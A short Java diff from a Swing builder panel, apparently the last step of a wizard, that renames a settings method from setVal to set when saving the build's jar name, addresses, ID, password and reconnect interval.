@@ -266,11 +266,11 @@ public class PanelBuildFinal extends JPanel {
 						rawAddresses += s + ",";
 					}
 
-					Settings.getGlobal().setVal("brecat", reconSec);
-					Settings.getGlobal().setVal("jarname", name);
-					Settings.getGlobal().setVal("baddresses", rawAddresses);
-					Settings.getGlobal().setVal("bid", ID);
-					Settings.getGlobal().setVal("bpass", pass);
+					Settings.getGlobal().set("brecat", reconSec);
+					Settings.getGlobal().set("jarname", name);
+					Settings.getGlobal().set("baddresses", rawAddresses);
+					Settings.getGlobal().set("bid", ID);
+					Settings.getGlobal().set("bpass", pass);
 					Settings.getGlobal().save();
 				} catch (Exception ex) {
 					ErrorDialog.create(ex);
